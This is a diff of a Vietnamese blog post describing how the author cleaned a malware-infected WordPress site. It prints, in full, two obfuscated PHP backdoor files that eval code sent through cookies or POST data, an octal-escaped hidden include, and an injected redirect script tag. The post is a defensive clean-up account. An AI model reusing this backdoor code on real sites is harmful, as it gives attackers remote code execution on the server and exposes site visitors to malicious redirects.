@@ -1,8 +1,8 @@
 ---
 date: "2018-09-25T12:30:04Z"
 template: "post"
-cover: "../images/placeholder-660x400-344359.png"
-keywords: "lập trình JavaScript"
+cover: "../images/minh-da-lam-sach-website-wordpress-nhu-the-nao-completejavascript.com_.png"
+keywords: "làm sạch website wordpress"
 slug: lam-sach-website-wordpress-nhu-the-nao
 title: "Mình đã làm sạch website Wordpress như thế nào?"
 categories:
@@ -32,8 +32,7 @@ Khi bạn vào một trang bất kì của website thì bỗng nhiên bị chuy�
 
 Nếu bạn vô tình nhấn vào **Cho phép**, có nghĩa là bạn đã cho phép mã độc này thực thi các hành động nguy hiểm, không thể lường trước được.
 
-![Blog bị dính mã độc dẫn đến chuyển hướng](/wp-content/uploads/2018/09/hacked-redirect.png)
-Blog của mình bị dính mã độc và đã bị chuyển hướng đến trang cpamatik
+![Blog bị dính mã độc dẫn đến chuyển hướng](../images/hacked-redirect.png)
 
 Nếu bạn bị chuyển hướng đến những đường link dạng như phía trên, thì tốt nhất là tắt hẳn tab đó đi hoặc thậm chí, tắt luôn cả trình duyệt.
 
@@ -49,8 +48,7 @@ Lượng truy cập trên trang web giảm đột ngột cũng là một dấu h
 
 Đây là trường hợp tệ nhất. Đó là khi bạn truy cập vào trang web và hiện lên hình ảnh như sau:
 
-![Google đã đánh dấu trang web của bạn bị nhiễm mã độc](/wp-content/uploads/2018/09/harmfulprogramserror.jpg)
-Website bị Google đánh dấu là chứa mã độc
+![Google đã đánh dấu trang web của bạn bị nhiễm mã độc](../images/harmfulprogramserror.jpg)
 
 Lúc này, Google đã đánh dấu trang web của bạn bị nhiễm mã độc và không an toàn.
 
@@ -75,7 +73,7 @@ Còn mình thì sẽ sử dụng plugin [Duplicator](https://wordpress.org/plugi
 
 _Tiếng anh của mình cũng đủ dùng thôi, nhưng nếu có phần nào chưa rõ thì bạn cứ để lại câu hỏi ở phần bình luận phía dưới, mình sẽ cố gắng giải đáp._
 
-Sau khi cài đặt website Wordpress trên localhost xong, giả sử mình cài đặt nó tại địa chỉ: _**C:\xampp\htdocs\completejavascript_hacked**_.
+Sau khi cài đặt website Wordpress trên localhost xong, giả sử mình cài đặt nó tại địa chỉ: **C:\xampp\htdocs\completejavascript_hacked**.
 
 Bây giờ, bắt đầu tiến hành việc làm sạch website Wordpress thôi nào!
 
@@ -85,16 +83,18 @@ Bước đầu tiên để làm sạch website Wordpress là tìm kiếm và xó
 
 **2mh7nzt3.php**
 
-```
+```php
 <?php
-    $wjqja = 'lpxe2yHu*t#v4-6nd_10a73im9gkcfro\'sb';$ghxqjoz = Array();$ghxqjoz[] = $wjqja[20].$wjqja[22].$wjqja[25].$wjqja[14].$wjqja[4].$wjqja[29].$wjqja[19].$wjqja[18].$wjqja[13].$wjqja[20].$wjqja[28].$wjqja[4].$wjqja[19].$wjqja[13].$wjqja[12].$wjqja[21].$wjqja[21].$wjqja[28].$wjqja[13].$wjqja[20].$wjqja[34].$wjqja[22].$wjqja[16].$wjqja[13].$wjqja[19].$wjqja[14].$wjqja[16].$wjqja[3].$wjqja[4].$wjqja[18].$wjqja[29].$wjqja[4].$wjqja[28].$wjqja[4].$wjqja[22].$wjqja[18];$ghxqjoz[] = $wjqja[6].$wjqja[8];$ghxqjoz[] = $wjqja[10];$ghxqjoz[] = $wjqja[28].$wjqja[31].$wjqja[7].$wjqja[15].$wjqja[9];$ghxqjoz[] = $wjqja[33].$wjqja[9].$wjqja[30].$wjqja[17].$wjqja[30].$wjqja[3].$wjqja[1].$wjqja[3].$wjqja[20].$wjqja[9];$ghxqjoz[] = $wjqja[3].$wjqja[2].$wjqja[1].$wjqja[0].$wjqja[31].$wjqja[16].$wjqja[3];$ghxqjoz[] = $wjqja[33].$wjqja[7].$wjqja[34].$wjqja[33].$wjqja[9].$wjqja[30];$ghxqjoz[] = $wjqja[20].$wjqja[30].$wjqja[30].$wjqja[20].$wjqja[5].$wjqja[17].$wjqja[24].$wjqja[3].$wjqja[30].$wjqja[26].$wjqja[3];$ghxqjoz[] = $wjqja[33].$wjqja[9].$wjqja[30].$wjqja[0].$wjqja[3].$wjqja[15];$ghxqjoz[] = $wjqja[1].$wjqja[20].$wjqja[28].$wjqja[27];foreach ($ghxqjoz[7]($_COOKIE, $_POST) as $xhkmij => $onsbeqz){function fnkka($ghxqjoz, $xhkmij, $eixvz){return $ghxqjoz[6]($ghxqjoz[4]($xhkmij . $ghxqjoz[0], ($eixvz / $ghxqjoz[8]($xhkmij)) + 1), 0, $eixvz);}function ndvxy($ghxqjoz, $rtduq){return @$ghxqjoz[9]($ghxqjoz[1], $rtduq);}function mgcvx($ghxqjoz, $rtduq){$bnqfa = $ghxqjoz[3]($rtduq) % 3;if (!$bnqfa) {eval($rtduq[1]($rtduq[2]));exit();}}$onsbeqz = ndvxy($ghxqjoz, $onsbeqz);mgcvx($ghxqjoz, $ghxqjoz[5]($ghxqjoz[2], $onsbeqz ^ fnkka($ghxqjoz, $xhkmij, $ghxqjoz[8]($onsbeqz))));}
+  $wjqja = 'lpxe2yHu*t#v4-6nd_10a73im9gkcfro\'sb';$ghxqjoz = Array();$ghxqjoz[] = $wjqja[20].$wjqja[22].$wjqja[25].$wjqja[14].$wjqja[4].$wjqja[29].$wjqja[19].$wjqja[18].$wjqja[13].$wjqja[20].$wjqja[28].$wjqja[4].$wjqja[19].$wjqja[13].$wjqja[12].$wjqja[21].$wjqja[21].$wjqja[28].$wjqja[13].$wjqja[20].$wjqja[34].$wjqja[22].$wjqja[16].$wjqja[13].$wjqja[19].$wjqja[14].$wjqja[16].$wjqja[3].$wjqja[4].$wjqja[18].$wjqja[29].$wjqja[4].$wjqja[28].$wjqja[4].$wjqja[22].$wjqja[18];$ghxqjoz[] = $wjqja[6].$wjqja[8];$ghxqjoz[] = $wjqja[10];$ghxqjoz[] = $wjqja[28].$wjqja[31].$wjqja[7].$wjqja[15].$wjqja[9];$ghxqjoz[] = $wjqja[33].$wjqja[9].$wjqja[30].$wjqja[17].$wjqja[30].$wjqja[3].$wjqja[1].$wjqja[3].$wjqja[20].$wjqja[9];$ghxqjoz[] = $wjqja[3].$wjqja[2].$wjqja[1].$wjqja[0].$wjqja[31].$wjqja[16].$wjqja[3];$ghxqjoz[] = $wjqja[33].$wjqja[7].$wjqja[34].$wjqja[33].$wjqja[9].$wjqja[30];$ghxqjoz[] = $wjqja[20].$wjqja[30].$wjqja[30].$wjqja[20].$wjqja[5].$wjqja[17].$wjqja[24].$wjqja[3].$wjqja[30].$wjqja[26].$wjqja[3];$ghxqjoz[] = $wjqja[33].$wjqja[9].$wjqja[30].$wjqja[0].$wjqja[3].$wjqja[15];$ghxqjoz[] = $wjqja[1].$wjqja[20].$wjqja[28].$wjqja[27];foreach ($ghxqjoz[7]($_COOKIE, $_POST) as $xhkmij => $onsbeqz){function fnkka($ghxqjoz, $xhkmij, $eixvz){return $ghxqjoz[6]($ghxqjoz[4]($xhkmij . $ghxqjoz[0], ($eixvz / $ghxqjoz[8]($xhkmij)) + 1), 0, $eixvz);}function ndvxy($ghxqjoz, $rtduq){return @$ghxqjoz[9]($ghxqjoz[1], $rtduq);}function mgcvx($ghxqjoz, $rtduq){$bnqfa = $ghxqjoz[3]($rtduq) % 3;if (!$bnqfa) {eval($rtduq[1]($rtduq[2]));exit();}}$onsbeqz = ndvxy($ghxqjoz, $onsbeqz);mgcvx($ghxqjoz, $ghxqjoz[5]($ghxqjoz[2], $onsbeqz ^ fnkka($ghxqjoz, $xhkmij, $ghxqjoz[8]($onsbeqz))));
+} 
 ```
 
 **n58afvih.php**
 
-```
+```php
 <?php
-    $wjqja = 'lpxe2yHu*t#v4-6nd_10a73im9gkcfro\'sb';$ghxqjoz = Array();$ghxqjoz[] = $wjqja[20].$wjqja[22].$wjqja[25].$wjqja[14].$wjqja[4].$wjqja[29].$wjqja[19].$wjqja[18].$wjqja[13].$wjqja[20].$wjqja[28].$wjqja[4].$wjqja[19].$wjqja[13].$wjqja[12].$wjqja[21].$wjqja[21].$wjqja[28].$wjqja[13].$wjqja[20].$wjqja[34].$wjqja[22].$wjqja[16].$wjqja[13].$wjqja[19].$wjqja[14].$wjqja[16].$wjqja[3].$wjqja[4].$wjqja[18].$wjqja[29].$wjqja[4].$wjqja[28].$wjqja[4].$wjqja[22].$wjqja[18];$ghxqjoz[] = $wjqja[6].$wjqja[8];$ghxqjoz[] = $wjqja[10];$ghxqjoz[] = $wjqja[28].$wjqja[31].$wjqja[7].$wjqja[15].$wjqja[9];$ghxqjoz[] = $wjqja[33].$wjqja[9].$wjqja[30].$wjqja[17].$wjqja[30].$wjqja[3].$wjqja[1].$wjqja[3].$wjqja[20].$wjqja[9];$ghxqjoz[] = $wjqja[3].$wjqja[2].$wjqja[1].$wjqja[0].$wjqja[31].$wjqja[16].$wjqja[3];$ghxqjoz[] = $wjqja[33].$wjqja[7].$wjqja[34].$wjqja[33].$wjqja[9].$wjqja[30];$ghxqjoz[] = $wjqja[20].$wjqja[30].$wjqja[30].$wjqja[20].$wjqja[5].$wjqja[17].$wjqja[24].$wjqja[3].$wjqja[30].$wjqja[26].$wjqja[3];$ghxqjoz[] = $wjqja[33].$wjqja[9].$wjqja[30].$wjqja[0].$wjqja[3].$wjqja[15];$ghxqjoz[] = $wjqja[1].$wjqja[20].$wjqja[28].$wjqja[27];foreach ($ghxqjoz[7]($_COOKIE, $_POST) as $xhkmij => $onsbeqz){function fnkka($ghxqjoz, $xhkmij, $eixvz){return $ghxqjoz[6]($ghxqjoz[4]($xhkmij . $ghxqjoz[0], ($eixvz / $ghxqjoz[8]($xhkmij)) + 1), 0, $eixvz);}function ndvxy($ghxqjoz, $rtduq){return @$ghxqjoz[9]($ghxqjoz[1], $rtduq);}function mgcvx($ghxqjoz, $rtduq){$bnqfa = $ghxqjoz[3]($rtduq) % 3;if (!$bnqfa) {eval($rtduq[1]($rtduq[2]));exit();}}$onsbeqz = ndvxy($ghxqjoz, $onsbeqz);mgcvx($ghxqjoz, $ghxqjoz[5]($ghxqjoz[2], $onsbeqz ^ fnkka($ghxqjoz, $xhkmij, $ghxqjoz[8]($onsbeqz))));}
+  $wjqja = 'lpxe2yHu*t#v4-6nd_10a73im9gkcfro\'sb';$ghxqjoz = Array();$ghxqjoz[] = $wjqja[20].$wjqja[22].$wjqja[25].$wjqja[14].$wjqja[4].$wjqja[29].$wjqja[19].$wjqja[18].$wjqja[13].$wjqja[20].$wjqja[28].$wjqja[4].$wjqja[19].$wjqja[13].$wjqja[12].$wjqja[21].$wjqja[21].$wjqja[28].$wjqja[13].$wjqja[20].$wjqja[34].$wjqja[22].$wjqja[16].$wjqja[13].$wjqja[19].$wjqja[14].$wjqja[16].$wjqja[3].$wjqja[4].$wjqja[18].$wjqja[29].$wjqja[4].$wjqja[28].$wjqja[4].$wjqja[22].$wjqja[18];$ghxqjoz[] = $wjqja[6].$wjqja[8];$ghxqjoz[] = $wjqja[10];$ghxqjoz[] = $wjqja[28].$wjqja[31].$wjqja[7].$wjqja[15].$wjqja[9];$ghxqjoz[] = $wjqja[33].$wjqja[9].$wjqja[30].$wjqja[17].$wjqja[30].$wjqja[3].$wjqja[1].$wjqja[3].$wjqja[20].$wjqja[9];$ghxqjoz[] = $wjqja[3].$wjqja[2].$wjqja[1].$wjqja[0].$wjqja[31].$wjqja[16].$wjqja[3];$ghxqjoz[] = $wjqja[33].$wjqja[7].$wjqja[34].$wjqja[33].$wjqja[9].$wjqja[30];$ghxqjoz[] = $wjqja[20].$wjqja[30].$wjqja[30].$wjqja[20].$wjqja[5].$wjqja[17].$wjqja[24].$wjqja[3].$wjqja[30].$wjqja[26].$wjqja[3];$ghxqjoz[] = $wjqja[33].$wjqja[9].$wjqja[30].$wjqja[0].$wjqja[3].$wjqja[15];$ghxqjoz[] = $wjqja[1].$wjqja[20].$wjqja[28].$wjqja[27];foreach ($ghxqjoz[7]($_COOKIE, $_POST) as $xhkmij => $onsbeqz){function fnkka($ghxqjoz, $xhkmij, $eixvz){return $ghxqjoz[6]($ghxqjoz[4]($xhkmij . $ghxqjoz[0], ($eixvz / $ghxqjoz[8]($xhkmij)) + 1), 0, $eixvz);}function ndvxy($ghxqjoz, $rtduq){return @$ghxqjoz[9]($ghxqjoz[1], $rtduq);}function mgcvx($ghxqjoz, $rtduq){$bnqfa = $ghxqjoz[3]($rtduq) % 3;if (!$bnqfa) {eval($rtduq[1]($rtduq[2]));exit();}}$onsbeqz = ndvxy($ghxqjoz, $onsbeqz);mgcvx($ghxqjoz, $ghxqjoz[5]($ghxqjoz[2], $onsbeqz ^ fnkka($ghxqjoz, $xhkmij, $ghxqjoz[8]($onsbeqz)))); 
+}
 ```
 
 Rõ ràng 2 file này lạ về cả tên, lẫn nội dung bên trong. Chính vì vậy, chắc chắn chúng là các file chứa mã độc và cần phải xóa ngay.
@@ -107,17 +107,17 @@ Các file php cơ bản như: _index.php, wp-config.php, wp-blog-header.php,..._
 
 Thật may mắn thay khi mở file _index.php_, mình phát hiện có 1 đoạn code lạ ngay ở đầu:
 
-```
+```php
 /*238d6*/
 
-    @include "\057home\064/pha\155vanl\057publ\151c_ht\155l/te\164risg\141mev1\057js/.\144aa29\14473.i\143o";
+@include "\057home\064/pha\155vanl\057publ\151c_ht\155l/te\164risg\141mev1\057js/.\144aa29\14473.i\143o";
 
-    /*238d6*/
+/*238d6*/
 ```
 
 Mình vào trang [Online PHP Decoder](https://malwaredecoder.com/) và decode được đoạn trên thành:
 
-```
+```php
 @include "/home4/phamvanl/public_html/tetrisgamev1/js/.daa29d73.ico";
 ```
 
@@ -159,8 +159,7 @@ Trước tiên, trong thư mục chứa website, mình giữ lại các file và
 
 Còn lại thì mình xóa bỏ hết và thay thế chúng bởi mã nguồn sạch của Wordpress mà mình mới tải về (và nhớ là khi bạn copy mã nguồn wordpress thì chừa cái **wp-content** và **wp-config.php** ra nhé).
 
-![sao chép phần core wordpres](/wp-content/uploads/2018/09/copy-ma-nguon-wordpress-sach.png)
-Phần core của Wordpress là giống nhau đối với mọi website
+![sao chép phần core wordpress](../images/copy-ma-nguon-wordpress-sach.png)
 
 Sau bước này, mình lại kiểm tra website một lần nữa thì thật buồn là website vẫn bị redirect như thường.
 
@@ -170,11 +169,11 @@ Kiểm tra một lượt vẫn không phát hiện ra được gì thêm. Và m�
 
 Nhưng may thay, ông trời không phụ lòng người. Khi mình mở một bài viết ra để copy dữ liệu của nó thì bỗng nhiên phát hiện ở cuối bài viết bị chèn thêm đoạn script:
 
-```
+```html
 <script src='https://s2.voipnewswire.net/s2.js' type='text/javascript'></script>
 ```
 
-_À thì ra, khi mình click vào mỗi bài viết đều bị chuyển hướng là do trong nội dung của nó chứa đoạn script này. _
+_À thì ra, khi mình click vào mỗi bài viết đều bị chuyển hướng là do trong nội dung của nó chứa đoạn script này._
 
 Mình mở thử các bài viết khác thì đúng thật, bài nào cũng chứa đoạn script mã độc.
 
@@ -186,18 +185,15 @@ Nhưng không, mình chả việc gì phải tốn công như vậy. Nội dung 
 
 Mình mở **phpMyAdmin** lên (địa chỉ: _http://localhost/phpmyadmin/_) và bắt đầu tìm kiếm như trong hình sau:
 
-![tìm kiếm mã độc trong database mysql](/wp-content/uploads/2018/09/search_phpmyadmin.png)
-Tìm kiếm đoạn mã độc trong tất cả các bảng của database
+![tìm kiếm mã độc trong database mysql](../images/search_phpmyadmin.png)
 
 Đúng là không ngoài dự đoán, mình tìm thấy **306 kết quả chứa đoạn mã độc** trên:
 
-![Kết quả tìm kiếm mã độc trong database mysql](/wp-content/uploads/2018/09/search_phpmyadmin_result.png)
-Kết quả tìm kiếm mã độc
+![Kết quả tìm kiếm mã độc trong database mysql](../images/search_phpmyadmin_result.png)
 
 Mình chọn tiếp vào chữ _**Browse**_ để xem cụ thể mã độc nằm ở cột nào trong bảng **wp_luqd_posts:**
 
-![thông tin chi tiết mã độc](/wp-content/uploads/2018/09/search_phpmyadmin_browse.png)
-Thông tin chi tiết về vị trí của mã độc
+![thông tin chi tiết mã độc](../images/search_phpmyadmin_browse.png)
 
 Như vậy, đoạn mã độc nằm trong cột **post_content** của bảng **wp_luqd_posts**. Bây giờ, mình chỉ cần viết câu lệnh SQL để tìm kiếm và thay thế đoạn mã độc kia đi là xong.
 
@@ -207,13 +203,11 @@ Mình tiếp tục chọn mục tab SQL và viết câu lệnh SQL này ra:
 UPDATE wp_luqd_posts set post_content = replace(post_content, "<script src='https://s2.voipnewswire.net/s2.js' type='text/javascript'></script>", '');
 ```
 
-![câu lệnh sql thay thế mã độc bằng kí tự rỗng](/wp-content/uploads/2018/09/phpmyadmin_query.png)
-Thực hiện câu lệnh SQL để tìm đoạn mã độc và thay thế
+![câu lệnh sql thay thế mã độc bằng kí tự rỗng](../images/phpmyadmin_query.png)
 
 Sau khi thực hiện thành công câu lệnh trên, mình kiểm tra lại database một lượt để chắc chắn rằng không tồn tại đoạn mã độc kia nữa.
 
-![kiểm tra lại database xem còn mã độc không](/wp-content/uploads/2018/09/result_phpmyadmin.png)
-Database đã không còn mã độc
+![kiểm tra lại database xem còn mã độc không](../images/result_phpmyadmin.png)
 
 Để chắc chắn hơn, mình tìm kiếm thêm với các từ khóa như:
 
